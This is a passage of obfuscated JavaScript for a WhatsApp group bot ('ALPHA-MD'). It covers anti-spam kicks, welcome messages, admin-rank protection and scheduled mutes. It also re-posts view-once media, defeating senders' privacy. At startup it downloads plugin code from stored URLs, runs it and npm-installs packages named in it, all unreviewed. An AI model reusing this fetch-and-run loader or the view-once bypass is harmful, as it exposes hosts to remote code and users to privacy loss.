    if (_0x4204b7.message?.['viewOnceMessage'] || _0x4204b7.message?.["viewOnceMessageV2"] || _0x4204b7.message?.["viewOnceMessageV2Extension"]) {
      if (conf.ANTI_VV.toLowerCase() == 'yes' && !_0x4204b7.key.fromMe) {
        let _0x5135ea = _0x4204b7.message[_0x59c6eb];
        if (_0x5135ea.message.imageMessage) {
          var _0x34982c = await _0x2b16fe.downloadAndSaveMediaMessage(_0x5135ea.message.imageMessage);
          var _0x392b78 = _0x5135ea.message.imageMessage.caption;
          await _0x2b16fe.sendMessage(_0x46b079, {
            'image': {
              'url': _0x34982c
            },
            'caption': _0x392b78
          }, {
            'quoted': _0x4204b7
          });
        } else {
          if (_0x5135ea.message.videoMessage) {
            var _0x2187d8 = await _0x2b16fe.downloadAndSaveMediaMessage(_0x5135ea.message.videoMessage);
            var _0x392b78 = _0x5135ea.message.videoMessage.caption;
            await _0x2b16fe.sendMessage(_0x46b079, {
              'video': {
                'url': _0x2187d8
              },
              'caption': _0x392b78
            }, {
              'quoted': _0x4204b7
            });
          } else {
            if (_0x5135ea.message.audioMessage) {
              var _0x20c34c = await _0x2b16fe.downloadAndSaveMediaMessage(_0x5135ea.message.audioMessage);
              await _0x2b16fe.sendMessage(_0x46b079, {
                'audio': {
                  'url': _0x20c34c
                },
                'mymetype': 'audio/mp4'
              }, {
                'quoted': _0x4204b7,
                'ptt': false
              });
            }
          }
        }
      }
    }
    ;
    if (_0x4204b7.message?.['imageMessage'] || _0x4204b7.message?.['audioMessage'] || _0x4204b7.message?.['videoMessage'] || _0x4204b7.message?.['stickerMessage'] || _0x4204b7.message?.["documentMessage"]) {
      let _0x2b6612;
      if (dbCache.has("antispam")) {
        _0x2b6612 = dbCache.get("antispam").includes(_0x36d7be);
      } else {
        let _0x28cf0a = await isGroupspam();
        _0x2b6612 = _0x28cf0a.includes(_0x36d7be);
        dbCache.set("antispam", _0x28cf0a);
      }
      if (_0x4fb3e2 && _0x2b6612 && !_0x164572 && !_0x455f1f) {
        console.warn('------------------Media------sent--------------------');
        let _0x17f66c = _0x17bcb6.get(_0x27905a + '_' + _0x36d7be);
        if (_0x17f66c) {
          if (_0x17f66c.length >= 0x4) {
            _0x17f66c.push(_0x4204b7.key);
            _0x17f66c.forEach(_0x4cc10f => {
              _0x2b16fe.sendMessage(_0x36d7be, {
                'delete': _0x4cc10f
              });
            });
            _0x2b16fe.groupParticipantsUpdate(_0x36d7be, [_0x27905a], 'remove').then(_0xe03f0d => {
              _0x2b16fe.sendMessage(_0x36d7be, {
                'text': '@' + _0x27905a.split('@')[0x0] + " removed because of spaming in group",
                'mentions': [_0x27905a]
              });
            })["catch"](_0x51d240 => console.log(_0x51d240));
          } else {
            _0x17f66c.push(_0x4204b7.key);
            _0x17bcb6.set(_0x27905a + '_' + _0x36d7be, _0x17f66c, 0x78);
          }
        } else {
          _0x17bcb6.set(_0x27905a + '_' + _0x36d7be, [_0x4204b7.key]);
        }
      }
    }
  });
  _0x2b16fe.ev.on("group-participants.update", async _0x4c868f => {
    const _0x21fbc6 = _0x2cf439 => {
      if (!_0x2cf439) {
        return _0x2cf439;
      }
      if (/:\d+@/gi.test(_0x2cf439)) {
        0x0;
        let _0x3670bb = baileys_1.jidDecode(_0x2cf439) || {};
        return _0x3670bb.user && _0x3670bb.server && _0x3670bb.user + '@' + _0x3670bb.server || _0x2cf439;
      } else {
        return _0x2cf439;
      }
    };
    console.log(_0x4c868f);
    let _0x1d380c;
    try {
      _0x1d380c = await _0x2b16fe.profilePictureUrl(_0x4c868f.id, "image");
    } catch {
      _0x1d380c = "https://telegra.ph/file/4cc2712eee93c105f6739.jpg";
    }
    try {
      const _0x52889d = await _0x2b16fe.groupMetadata(_0x4c868f.id);
      groupMetadataCache.set(_0x4c868f.id, _0x52889d);
      if (_0x4c868f.action == "add" && (await recupevents(_0x4c868f.id, "welcome")) == "oui") {
        let _0x1c8eef = "╔════⦕𝐀𝐋𝐏𝐇𝐀-𝐌𝐃⦖═════╗\n║ you may read the group description to avoid being kicked out of the group.Anyway you are welcomed new member(s)\n║ *New Member(s):*\n";
        let _0x5f092a = _0x4c868f.participants;
        for (let _0x733b54 of _0x5f092a) {
          _0x1c8eef += "║ @" + _0x733b54.split('@')[0x0] + "\n";
        }
        _0x1c8eef += "║\n╚════◇༒◇═════╝\n◇ *Description*   ◇\n\n" + _0x52889d.desc;
        _0x2b16fe.sendMessage(_0x4c868f.id, {
          'image': {
            'url': _0x1d380c
          },
          'caption': _0x1c8eef,
          'mentions': _0x5f092a
        });
      } else {
        if (_0x4c868f.action == "remove" && (await recupevents(_0x4c868f.id, "goodbye")) == 'on') {
          let _0x546a38 = "Un ou des membres vient(nent) de quitter le groupe;\n";
          let _0x1c1831 = _0x4c868f.participants;
          for (let _0x33bf47 of _0x1c1831) {
            _0x546a38 += '@' + _0x33bf47.split('@')[0x0] + "\n";
          }
          _0x2b16fe.sendMessage(_0x4c868f.id, {
            'text': _0x546a38,
            'mentions': _0x1c1831
          });
        } else {
          if (_0x4c868f.action == 'promote' && (await recupevents(_0x4c868f.id, 'antipromote')) == 'on') {
            if (_0x4c868f.author == _0x52889d.owner || _0x4c868f.author == conf.NUMERO_OWNER + "@s.whatsapp.net" || _0x4c868f.author == _0x21fbc6(_0x2b16fe.user.id) || _0x4c868f.author == _0x4c868f.participants[0x0]) {
              console.log("Cas de superUser je fais rien");
              return;
            }
            ;
            await _0x2b16fe.groupParticipantsUpdate(_0x4c868f.id, [_0x4c868f.author, _0x4c868f.participants[0x0]], "demote");
            _0x2b16fe.sendMessage(_0x4c868f.id, {
              'text': '@' + _0x4c868f.author.split('@')[0x0] + " has violated the anti-promotion rule, therefore both " + _0x4c868f.author.split('@')[0x0] + " and @" + _0x4c868f.participants[0x0].split('@')[0x0] + " have been removed from administrative rights.",
              'mentions': [_0x4c868f.author, _0x4c868f.participants[0x0]]
            });
          } else {
            if (_0x4c868f.action == "demote" && (await recupevents(_0x4c868f.id, "antidemote")) == 'on') {
              if (_0x4c868f.author == _0x52889d.owner || _0x4c868f.author == conf.NUMERO_OWNER + "@s.whatsapp.net" || _0x4c868f.author == _0x21fbc6(_0x2b16fe.user.id) || _0x4c868f.author == _0x4c868f.participants[0x0]) {
                console.log("Cas de superUser je fais rien");
                return;
              }
              ;
              await _0x2b16fe.groupParticipantsUpdate(_0x4c868f.id, [_0x4c868f.author], 'demote');
              await _0x2b16fe.groupParticipantsUpdate(_0x4c868f.id, [_0x4c868f.participants[0x0]], 'promote');
              _0x2b16fe.sendMessage(_0x4c868f.id, {
                'text': '@' + _0x4c868f.author.split('@')[0x0] + " has violated the anti-demotion rule by removing @" + _0x4c868f.participants[0x0].split('@')[0x0] + ". Consequently, he has been stripped of administrative rights.",
                'mentions': [_0x4c868f.author, _0x4c868f.participants[0x0]]
              });
            }
          }
        }
      }
    } catch (_0xf784e4) {
      console.error(_0xf784e4);
    }
  });
  _0x2b16fe.ev.on("group.update", async _0x5cd66d => {
    groupMetadataCache.set(_0x5cd66d.id, _0x5cd66d);
  });
  _0x2b16fe.ev.on('contacts.upsert', async _0x58e7d6 => {
    const _0xbea52b = _0x1e1a03 => {
      for (const _0x50d9d1 of _0x1e1a03) {
        if (store.contacts[_0x50d9d1.id]) {
          Object.assign(store.contacts[_0x50d9d1.id], _0x50d9d1);
        } else {
          store.contacts[_0x50d9d1.id] = _0x50d9d1;
        }
      }
      return;
    };
    _0xbea52b(_0x58e7d6);
  });
  _0x2b16fe.ev.on('connection.update', async _0x440e5b => {
    const {
      connection: _0xbc8c1,
      lastDisconnect: _0x2ea54d
    } = _0x440e5b;
    if (_0xbc8c1 == 'connecting') {
      console.log("connection en cours...");
    } else {
      if (_0xbc8c1 == "close") {
        let _0xaaa6d = new Boom(_0x2ea54d?.["error"])?.["output"]["statusCode"];
        if (_0xaaa6d == DisconnectReason.connectionClosed) {
          console.log("Connexion fermee , reconnexion en cours");
          connectToWhatsapp();
        } else {
          if (_0xaaa6d == DisconnectReason.badSession) {
            console.log("La session id est erronee,  veillez la remplacer");
          } else {
            if (_0xaaa6d === DisconnectReason.connectionReplaced) {
              console.log("connexion réplacée ,,, une session est déjà ouverte veuillez la fermer svp !!!");
            } else {
              if (_0xaaa6d === DisconnectReason.loggedOut) {
                console.log("vous êtes déconnecté,,, veuillez rescanner le code qr svp");
              } else {
                if (_0xaaa6d === DisconnectReason.restartRequired) {
                  console.log("redémarrage en cours ▶️");
                  connectToWhatsapp();
                } else {
                  if (_0xaaa6d === DisconnectReason.connectionLost) {
                    console.log("connexion au serveur perdue 😞 ,,, reconnexion en cours ... ");
                    connectToWhatsapp();
                  } else {
                    console.log("Raison de deconnection inattendue ; redemarrage du server");
                    const {
                      exec: _0x39cc32
                    } = require("child_process");
                    _0x39cc32("pm2 restart all");
                  }
                }
              }
            }
          }
        }
      } else {
        if (_0xbc8c1 == "open") {
          console.log("✅ connexion reussie! ☺️");
          await delay(0x1f4);
          let _0x5020df = await plug.pluginList();
          console.log(_0x5020df);
          if (_0x5020df.length > 0x0) {
            console.log("Chargement des plugins");
            let _0x24f561 = [];
            for (const _0x441fcc of _0x5020df) {
              if (_0x441fcc.name !== null && _0x441fcc.url !== null) {
                try {
                  let _0x7109cb = await fetch(_0x441fcc.url);
                  let _0x4a2555 = await _0x7109cb.text();
                  _0x24f561.push(..._0x12ab94(_0x4a2555));
                } catch (_0x1eca21) {
                  console.error("Erreur lors de la récupération du plugin " + _0x441fcc.name + ':', _0x1eca21);
                }
              }
            }
            for (const _0x549fba of _0x24f561) {
              try {
                await require(_0x549fba);
                _0x24f561.slice(_0x24f561.indexOf(_0x549fba), 0x1);
              } catch (_0x446787) {
                console.log("Dépendance " + _0x549fba + " non installée : " + _0x446787);
              }
            }
            try {
              if (_0x24f561.length > 0x0) {
                console.log("Les plugins suivants nécessitent des dépendances : " + _0x24f561.join(", "));
                _0x2b16fe.sendMessage(_0x2b16fe.user.id, {
                  'text': "The plugins required some dependancies so we proceding to installation... please wait"
                })["catch"](_0x117007 => console.log(_0x117007));
                const {
                  exec: _0x1368f7
                } = require("child_process");
                await new Promise((_0x3e9bc0, _0x51ba04) => {
                  _0x1368f7("npm install  " + _0x24f561.join(" ") + " --legacy-peer-deps", (_0x437787, _0x516d46, _0x1e5817) => {
                    if (_0x437787) {
                      _0x51ba04(_0x437787);
                    } else {
                      _0x2b16fe.sendMessage(_0x2b16fe.user.id, {
                        'text': "dependancies are installed successfully"
                      })["catch"](_0x38428c => console.log(_0x38428c));
                      _0x3e9bc0(_0x516d46);
                    }
                  });
                });
              }
            } catch (_0x19a441) {
              console.log("Erreur lors de l'installation des dépendances : " + _0x19a441);
            }
            for (const _0x5ba935 of _0x5020df) {
              if ((_0x5ba935.name !== null || _0x5ba935.url !== null) && !fs.existsSync(__dirname + "/commandes/" + _0x5ba935.name + ".js")) {
                try {
                  let _0x18c857 = await fetch(_0x5ba935.url);
                  let _0x15b181 = await _0x18c857.text();
                  fs.createWriteStream(__dirname + "/commandes/" + _0x5ba935.name + ".js").end(_0x15b181);
                } catch (_0x5a1c7a) {
                  console.log(_0x5a1c7a);
                }
              }
            }
            console.log("Chargement des plugins terminé ✅");
            _0x2b16fe.sendMessage(_0x2b16fe.user.id, {
              'text': "All plugins are installed successfully"
            })["catch"](_0x53bbf2 => console.log(_0x53bbf2));
            await delay(0x3e8);
          }
          fs.readdirSync(__dirname + "/commandes").forEach(_0x448140 => {
            if (path.extname(_0x448140).toLowerCase() == ".js") {
              try {
                require(__dirname + '/commandes/' + _0x448140);
                console.log(_0x448140 + " installé ✔️");
              } catch (_0x4d2000) {
                console.log(_0x448140 + " n'a pas pu être chargé pour les raisons suivantes : " + _0x4d2000);
                console.error(_0x4d2000);
              }
              delay(0x12c);
            }
          });
          await delay(0x2bc);
          var _0xc784c;
          if (conf.MODE.toLowerCase() === 'yes') {
            _0xc784c = 'public';
          } else if (conf.MODE.toLowerCase() === 'no') {
            _0xc784c = "private";
          } else {
            _0xc784c = "undefined";
          }
          console.log("chargement des commandes terminé ✅");
          await _0x4df09e();
          if (conf.DP.toLowerCase() === 'yes') {
            let _0x313a7b = "╔════❍\n║ ❴𝐀𝐋𝐏𝐇𝐀-𝐌𝐃 𝐢𝐬 𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝❵\n║    Prefix : [ " + prefixe + " ]\n║    Mode :" + _0xc784c + "\n║    Commandes: " + evt.cm.length + "︎\n╚══════════════════╝\n  \n╔═════◇\n║𝐑𝐞𝐠𝐚𝐫𝐝𝐬 𝐊𝐞𝐢𝐭𝐡𝐤𝐞𝐢𝐳𝐳𝐚𝐡\n║ \n╚══════════════════╝";
            await _0x2b16fe.sendMessage(_0x2b16fe.user.id, {
              'text': _0x313a7b
            });
          }
        }
      }
    }
  });
  _0x2b16fe.ev.on("creds.update", _0x3c0eb6);
  _0x2b16fe.downloadAndSaveMediaMessage = async (_0x1597ef, _0x61bf94 = '', _0x179d7f = true) => {
    let _0x56386e = _0x1597ef.msg ? _0x1597ef.msg : _0x1597ef;
    let _0x314c05 = (_0x1597ef.msg || _0x1597ef).mimetype || '';
    let _0xfabf07 = _0x1597ef.mtype ? _0x1597ef.mtype.replace(/Message/gi, '') : _0x314c05.split('/')[0x0];
    const _0x33eb30 = await downloadContentFromMessage(_0x56386e, _0xfabf07);
    let _0x4f744a = Buffer.from([]);
    for await (const _0x16a439 of _0x33eb30) {
      _0x4f744a = Buffer.concat([_0x4f744a, _0x16a439]);
    }
    let _0x59c5d4 = await FileType.fromBuffer(_0x4f744a);
    let _0x1b8db2 = './' + _0x61bf94 + '.' + _0x59c5d4.ext;
    await fs.writeFileSync(_0x1b8db2, _0x4f744a);
    return _0x1b8db2;
  };
  _0x2b16fe.awaitForMessage = async (_0x321d17 = {}) => {
    return new Promise((_0x1fc9d8, _0x44cb3d) => {
      if (typeof _0x321d17 !== 'object') {
        _0x44cb3d(new Error("Options must be an object"));
      }
      if (typeof _0x321d17.sender !== "string") {
        _0x44cb3d(new Error("Sender must be a string"));
      }
      if (typeof _0x321d17.chatJid !== "string") {
        _0x44cb3d(new Error("ChatJid must be a string"));
      }
      if (_0x321d17.timeout && typeof _0x321d17.timeout !== "number") {
        _0x44cb3d(new Error("Timeout must be a number"));
      }
      if (_0x321d17.filter && typeof _0x321d17.filter !== 'function') {
        _0x44cb3d(new Error("Filter must be a function"));
      }
      const _0x5538cd = _0x321d17?.["timeout"] || undefined;
      const _0x434625 = _0x321d17?.["filter"] || (() => true);
      let _0x5d96b2 = undefined;
      let _0x50cd12 = _0x1c711c => {
        let {
          type: _0x2026b8,
          messages: _0x2c85cd
        } = _0x1c711c;
        if (_0x2026b8 == "notify") {
          for (let _0x5342b0 of _0x2c85cd) {
            const _0x4ef9e3 = _0x5342b0.key.fromMe;
            const _0x4a1f8c = _0x5342b0.key.remoteJid;
            const _0x8b9d38 = _0x4a1f8c.endsWith('@g.us');
            const _0x161d15 = _0x4a1f8c == "status@broadcast";
            const _0x52084d = _0x4ef9e3 ? _0x2b16fe.user.id.replace(/:.*@/g, '@') : _0x8b9d38 || _0x161d15 ? _0x5342b0.key.participant.replace(/:.*@/g, '@') : _0x4a1f8c;
            if (_0x52084d == _0x321d17.sender && _0x4a1f8c == _0x321d17.chatJid && _0x434625(_0x5342b0)) {
              _0x2b16fe.ev.off("messages.upsert", _0x50cd12);
              clearTimeout(_0x5d96b2);
              _0x1fc9d8(_0x5342b0);
            }
          }
        }
      };
      _0x2b16fe.ev.on('messages.upsert', _0x50cd12);
      if (_0x5538cd) {
        _0x5d96b2 = setTimeout(() => {
          _0x2b16fe.ev.off("messages.upsert", _0x50cd12);
          _0x44cb3d(new Error("Timeout"));
        }, _0x5538cd);
      }
    });
  };
  async function _0x4df09e() {
    const _0x86a0a4 = require("node-cron");
    const {
      getCron: _0xcaf9b8
    } = require("./bdd/cron");
    let _0x3aa539 = await _0xcaf9b8();
    console.log(_0x3aa539);
    if (_0x3aa539.length > 0x0) {
      for (let _0x2139b1 = 0x0; _0x2139b1 < _0x3aa539.length; _0x2139b1++) {
        if (_0x3aa539[_0x2139b1].mute_at != null) {
          let _0x1a9b98 = _0x3aa539[_0x2139b1].mute_at.split(':');
          console.log("etablissement d'un automute pour " + _0x3aa539[_0x2139b1].group_id + " a " + _0x1a9b98[0x0] + " H " + _0x1a9b98[0x1]);
          _0x86a0a4.schedule(_0x1a9b98[0x1] + " " + _0x1a9b98[0x0] + " * * *", async () => {
            try {
              await _0x2b16fe.groupSettingUpdate(_0x3aa539[_0x2139b1].group_id, "announcement");
              _0x2b16fe.sendMessage(_0x3aa539[_0x2139b1].group_id, {
                'image': {
                  'url': './media/chrono.jpg'
                },
                'caption': "Tic Tac, the exciting discussions are coming to an end. Thank you for your active participation; now, it's time to close the group for today."
              });
            } catch (_0x2017b0) {
              console.log(_0x2017b0);
            }
          }, {
            'timezone': "Africa/Nairobi"
          });
        }
        if (_0x3aa539[_0x2139b1].unmute_at != null) {
          let _0x4307bd = _0x3aa539[_0x2139b1].unmute_at.split(':');
          console.log("etablissement d'un autounmute pour " + _0x4307bd[0x0] + " H " + _0x4307bd[0x1] + " ");
          _0x86a0a4.schedule(_0x4307bd[0x1] + " " + _0x4307bd[0x0] + " * * *", async () => {
            try {
              await _0x2b16fe.groupSettingUpdate(_0x3aa539[_0x2139b1].group_id, "not_announcement");
              _0x2b16fe.sendMessage(_0x3aa539[_0x2139b1].group_id, {
                'image': {
                  'url': './media/chrono.jpg'
                },
                'caption': "Time to open the doors of our new group! Welcome everyone to this exciting community where we share and learn together."
              });
            } catch (_0x16421e) {
              console.log(_0x16421e);
            }
          }, {
            'timezone': "Africa/Abidjan"
          });
        }
      }
    } else {
      console.log("Les crons n'ont pas été activés");
    }
    return;
  }
  function _0x12ab94(_0x2184d8) {
    let _0x189d99 = _0x2184d8.match(/require\(['"]([^'"]+)['"]\)/g);
    let _0x4396b6 = [];
    if (_0x189d99) {
      _0x189d99.forEach(_0x32e709 => {
        let _0xbd56c4 = _0x32e709.replace("require(", '').replace(')', '').replace(/['"]/g, '');
        if (!_0xbd56c4.startsWith('./') && !_0xbd56c4.startsWith("../")) {
          _0x4396b6.push(_0xbd56c4);
        }
      });
    }
    return _0x4396b6;
  }
}
connectToWhatsapp();
